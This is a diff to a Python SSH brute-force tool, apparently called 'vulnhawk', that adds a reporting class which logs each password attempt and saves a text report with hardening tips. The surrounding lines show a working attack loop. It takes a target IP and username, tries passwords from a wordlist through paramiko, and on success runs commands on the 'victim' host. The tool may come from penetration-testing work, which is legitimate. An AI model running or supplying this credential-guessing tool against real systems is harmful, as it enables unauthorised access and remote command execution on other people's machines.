@@ -2,6 +2,67 @@ import paramiko
 import os
 import sys  # Import sys to handle exit
 import time  # Import time for adding delays
+import datetime
+
+# Report class to gather and save the results
+class Report:
+    def __init__(self, target_ip, attack_type):
+        self.target_ip = target_ip
+        self.attack_type = attack_type
+        self.date = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        self.vulnerabilities = []
+        self.exploitation_attempts = []
+
+    def add_vulnerability(self, description):
+        self.vulnerabilities.append(description)
+
+    def add_exploitation_attempt(self, description, success):
+        status = "Success" if success else "Failed"
+        self.exploitation_attempts.append(f"{description} - {status}")
+
+    def generate_report(self):
+        report_content = f"""
+        SSH Exploitation Report
+        =======================
+        
+        Target IP: {self.target_ip}
+        Attack Type: {self.attack_type}
+        Date: {self.date}
+        
+        Summary of Findings:
+        --------------------
+        Vulnerabilities Identified: {len(self.vulnerabilities)}
+        Exploitation Attempts Made: {len(self.exploitation_attempts)}
+        
+        Detailed Vulnerabilities:
+        -------------------------
+        """
+        for idx, vuln in enumerate(self.vulnerabilities, 1):
+            report_content += f"{idx}. {vuln}\n"
+
+        report_content += "\nExploitation Attempts:\n----------------------\n"
+        for idx, attempt in enumerate(self.exploitation_attempts, 1):
+            report_content += f"{idx}. {attempt}\n"
+
+        report_content += "\nRecommendations:\n-----------------\n"
+        report_content += "1. Ensure strong, unique passwords are used for all accounts.\n"
+        report_content += "2. Disable root login over SSH if not required.\n"
+        report_content += "3. Regularly update the SSH server and associated libraries.\n"
+        report_content += "4. Implement two-factor authentication for SSH access.\n"
+
+        report_content += "\nConclusion:\n-----------\n"
+        report_content += "Review the identified vulnerabilities and apply the recommended actions to enhance the security of your SSH configuration.\n"
+
+        return report_content
+
+    def save_report(self):
+        # Generate a unique filename with attack type and timestamp
+        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
+        filename = f"vulnhawk_{self.attack_type}_report_{timestamp}.txt"
+        report_content = self.generate_report()
+        with open(filename, "w") as report_file:
+            report_file.write(report_content)
+        print(f"[+] Report saved as '{filename}'")
 
 def execute_commands_on_victim(client, password):
     try:
@@ -65,6 +126,10 @@ def main():
     
     host = input("Enter the target host IP: ")
     username = input("Enter the target username: ")
+
+    # Initialize report with attack type
+    report = Report(target_ip=host, attack_type="common_bruteforce")
+
     password_file_path = os.path.join(os.path.dirname(__file__), 'passwords.txt')
 
     # Check if the password file exists
@@ -87,18 +152,25 @@ def main():
                 client.connect(hostname=host, username=username, password=password, timeout=1)
                 
                 print(f"[+] Connected with Password {password}")
+                report.add_exploitation_attempt(f"Attempted SSH connection with password: {password}", True)
                 successful_password = password
                 execute_commands_on_victim(client, successful_password)
                 client.close()
                 break
             except paramiko.ssh_exception.AuthenticationException:
                 print("Authentication failed.")
+                report.add_exploitation_attempt(f"Attempted SSH connection with password: {password}", False)
             except Exception as e:
                 print(f"An error occurred: {e}")
+                report.add_exploitation_attempt(f"Attempted SSH connection with password: {password}", False)
             attempts += 1
 
     print("Common Brute Force Attack Completed.")
     time.sleep(2)  # Adding delay to observe the output
+
+    # Save the report with a unique filename
+    report.save_report()
+
     end_or_return()  # Call the function to ask the user what to do next
 
 def end_or_return():
